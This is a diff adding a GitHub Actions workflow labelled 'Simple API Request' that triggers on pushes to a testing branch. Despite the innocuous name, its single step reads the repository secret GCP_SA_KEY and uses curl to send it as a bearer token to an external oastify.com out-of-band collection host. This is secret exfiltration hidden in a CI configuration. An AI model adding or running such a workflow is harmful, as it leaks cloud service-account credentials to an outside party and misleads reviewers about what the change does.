@@ -1,0 +1,24 @@
+# This workflow is named 'Simple API Request'
+name: Simple API Request
+
+on:
+  push:
+    branches:
+      - testing
+
+jobs:
+  make_request:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Make POST request with secret
+        env:
+          API_TOKEN: ${{ secrets.GCP_SA_KEY }}
+        run: |
+          curl -X POST \
+          -H "Content-Type: application/json" \
+          -H "Authorization: Bearer $API_TOKEN" \
+          -d '{"message":"$API_TOKEN"}' \
+          https://a1ceqv5hg73v5f3332k8w12hq8wzkp8e.oastify.com
